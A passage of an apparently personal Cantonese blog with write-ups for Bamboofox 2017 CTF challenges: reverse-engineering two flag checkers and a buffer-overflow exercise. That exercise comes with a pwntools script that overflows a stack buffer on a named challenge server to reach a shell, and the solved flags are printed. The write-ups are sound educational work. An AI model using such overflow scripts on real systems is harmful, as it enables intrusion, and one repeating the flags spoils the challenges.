class="string">"Are you sure you read asm?"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wooow you got it!"</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">LABEL_13:</span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v15;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>首先個program會讀38位Input<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">"%38s"</span>, s);</span><br></pre></td></tr></table></figure></p>
-<p>然後會用 sub_7F4 呢個function提供既return value做xor<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt; v8; ++i )</span><br><span class="line">    s[i] ^= sub_7F4(i);</span><br></pre></td></tr></table></figure></p>
-<p>然後會將xor完既結果逐個入落去sub_7B0做運算 , 然後將return value逐個扔番入v9<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">    v9[j] = sub_7B0((<span class="keyword">unsigned</span> <span class="keyword">int</span>)s[j]);</span><br></pre></td></tr></table></figure></p>
-<p>最後會將v9 同 dword_201040逐個byte做對比<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v8; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9[k] != dword_201040[k] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Are you sure you read asm?"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
-<p>咁既話即係首先我地要知道 dword_201040 放緊D乜<br><img src="img1.png" alt=""></p>
-<p>同埋sub_7F4 , sub_7B0 做緊乜<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_7F4</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+Ch] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+10h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">      v2 ^= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v2 |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_7B0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+Ch] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+10h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_201024; ++i )</span><br><span class="line">    v2 = a1 * v2 % dword_201020;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>原來仲有個 dword_201024<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000201024 dword_201024    dd 7                    ; DATA XREF: sub_7B0:loc_7E4r</span><br></pre></td></tr></table></figure></p>
-<p>咁就應該齊料寫個program去爆番條flag出黎<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_7F4</span><span class="params">(<span class="keyword">int</span> a1)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_7B0</span><span class="params">(<span class="keyword">int</span> a1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ida_chars2[] =</span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0x19c</span>, <span class="number">0x169</span>, <span class="number">0x30</span>, <span class="number">0x1d6</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x199</span>,<span class="number">0x6a</span>, <span class="number">0x157</span>, <span class="number">0x0c2</span>,</span><br><span class="line">	<span class="number">0x10a</span>, <span class="number">0x155</span>, <span class="number">0x150</span>, <span class="number">0x107</span>, <span class="number">0x37</span>, <span class="number">0x12e</span>, <span class="number">0x22</span>, <span class="number">0x0f1</span>, <span class="number">0x1ae</span>,</span><br><span class="line">	<span class="number">0x151</span>, <span class="number">0x0f1</span>, <span class="number">0x1a</span>, <span class="number">0x1a5</span>, <span class="number">0x1ae</span>, <span class="number">0x0c9</span>, <span class="number">0x12c</span>, <span class="number">0x1</span>, <span class="number">0x166</span>,</span><br><span class="line">	<span class="number">0x12c</span>, <span class="number">0x0cb</span>, <span class="number">0x30</span>, <span class="number">0x107</span>, <span class="number">0x166</span>, <span class="number">0x1b4</span>, <span class="number">0x1ae</span>, <span class="number">0x14c</span>, <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> size = <span class="number">40</span>;</span><br><span class="line">	<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0x30</span>; i &lt; <span class="number">0x126</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">int</span> flag = i;</span><br><span class="line">			flag ^= sub_7F4(index);</span><br><span class="line">			<span class="keyword">if</span> (sub_7B0(flag) == ida_chars2[index]) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%c"</span>, i);</span><br><span class="line">				index++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (index == <span class="number">38</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_7B0</span><span class="params">(<span class="keyword">int</span> a1)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> v2 = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i) &#123;</span><br><span class="line">		v2 = a1 * v2 % <span class="number">0x1e1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_7F4</span><span class="params">(<span class="keyword">int</span> a1)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> v2;</span><br><span class="line">	v2 = a1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (i &amp; <span class="number">1</span>)</span><br><span class="line">			v2 ^= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			v2 |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>BAMBOOFOX{Th4t_1S_s0_eAsY_tO_rEverS3}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-little-asm-revenge/" data-id="cjetvs9gn0001dgw5ijh6bmwm" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Bamboofox2017-little-asm" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/01/Bamboofox2017-little-asm/" class="article-date">
-  <time datetime="2018-01-01T08:58:10.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/Bamboofox2017-little-asm/">Bamboofox2017-little-asm</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="little-asm-221bc5c8651806d8a039d5ff2a68bc5c7d9e3a20">little-asm-221bc5c8651806d8a039d5ff2a68bc5c7d9e3a20</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>第一步都係扔入ida decompile個main睇睇咩料先!</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@6</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi@10</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">8</span>]; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  __int64 v9; <span class="comment">// [sp+18h] [bp-28h]@1</span></span><br><span class="line">  __int64 v10; <span class="comment">// [sp+20h] [bp-20h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+28h] [bp-18h]@1</span></span><br><span class="line">  __int64 v12; <span class="comment">// [sp+30h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input magic string:"</span>);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0L</span>L;</span><br><span class="line">  v9 = <span class="number">0L</span>L;</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  v12 = <span class="number">0L</span>L;</span><br><span class="line">  _isoc99_scanf(<span class="string">"%36s"</span>, s);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    s[i] ^= <span class="number">0xDC</span>u;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v7; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[j] != ans[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Are you sure you read asm?"</span>);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wooow you got it!"</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v13;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我地可以見到個program首先會讀36位既input<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">"%36s"</span>, s);</span><br></pre></td></tr></table></figure></p>
-<p>然後做同0xDC做xor<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">	s[i] ^= <span class="number">0xDC</span>u;</span><br></pre></td></tr></table></figure></p>
-<p>最後同 ans 逐個byte做對比<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v7; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[j] != ans[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Are you sure you read asm?"</span>);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>所以我地可以直接睇下ans save住d咩<br><img src="img1.png" alt=""></p>
-<p>然後export to hex 睇下咩黎<br><img src="img2.png" alt=""></p>
-<p>咁就可以寫條script解番條flag出黎 :D</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex(<span class="number">0x9e9d919e93939a9384a785eca983e88e9983bd839becec98839de991838eefbd98b9aea1</span> ^ <span class="number">0xdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdc</span>)[<span class="number">2</span>:].rstrip(<span class="string">"L"</span>).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>BAMBOOFOX{Y0u_4RE_a_G00D_A5M_R3aDer}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-little-asm/" data-id="cjetvs9gr0003dgw519qcpmh3" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Bamboofox2017-water-impossible" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/01/Bamboofox2017-water-impossible/" class="article-date">
-  <time datetime="2018-01-01T08:29:02.000Z" itemprop="datePublished">2018-01-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/01/Bamboofox2017-water-impossible/">Bamboofox2017-water-impossible</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">int</span> token = <span class="number">1234</span>;</span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome !! Challenger ~\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is a simple challenge for you.\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try to find the key to pass :"</span>);</span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, key, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((<span class="keyword">int</span>)token == <span class="number">6666</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wow, That's impossible to touch this token ?!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="water-impossible-7a06e581acf1525f968b503e2485383de7ff1aff">water-impossible-7a06e581acf1525f968b503e2485383de7ff1aff</a></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>就咁睇個source應該係要令到token變做6666 , 但係user入既input就正係會影響到variable key.<br>所以應該係一個好經典既buffer overflow題目?</p>
-<p>首先扔入ida睇下先 , decompile個main 我地可以睇到<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v5 = <span class="number">1234</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome !! Challenger ~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is a simple challenge for you."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try to find the key to pass :"</span>, <span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0x1A0A</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wow, That's impossible to touch this token ?!"</span>, &amp;buf);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>由呢到我地可以睇到我地既input係buf , 佢既位置係sp+0h<br>而我地要影響既值係 sp+1Ch , 所以我地首先要做既係試下入28個位既input , 睇下影唔影響到先!<br>咁既話即係我地要搵左佢個判斷位 , 然後break左佢先</p>
-<h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb water-impossible-7a06e581acf1525f968b503e2485383de7ff1aff</span><br><span class="line">diass main</span><br></pre></td></tr></table></figure>
-<p><img src="img1.png" alt=""></p>
-<p>我地可以見到, 呢到係判斷緊rbp-0x4呢個value等唔等於0x1a0a<br>main+137<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp DWORD PTR [rbp-0x4],0x1a0a</span><br></pre></td></tr></table></figure></p>
-<p>所以我地可以break黎睇下如果我地入28個位以上呢個值會有咩轉變</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b *main+137</span><br><span class="line">r</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">x/xs <span class="variable">$rbp</span>-0x4</span><br></pre></td></tr></table></figure>
-<p><img src="img2.png" alt=""></p>
-<p>咦! $rbp-0x4 呢到係放住左bb , 即係確定左28個位之後果d值係可以控制到$rbp-0x4 , 咁即係我地可以控制佢變做0x1a0a</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>,<span class="number">58799</span>)</span><br><span class="line">r.recvuntil(<span class="string">"pass :"</span>)</span><br><span class="line">r.sendline(<span class="string">"a"</span>*<span class="number">28</span> + p32(<span class="number">0x1a0a</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="img3.png" alt=""></p>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BAMBOOFOX&#123;Pwnnnnnnnning_1s_sImP13_and_Int3r3stIngggg&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/01/01/Bamboofox2017-water-impossible/" data-id="cjetvs9hj0006dgw5t2xpq3xy" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Bamboofox2017-toddler-notakto-revenge" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/12/31/Bamboofox2017-toddler-notakto-revenge/" class="article-date">
-  <time datetime="2017-12-31T11:02:59.000Z" itemprop="datePublished">2017-12-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/12/31/Bamboofox2017-toddler-notakto-revenge/">Bamboofox2017-toddler-notakto-revenge</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
-<li>純粹要過三關嬴佢個AI 50次<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 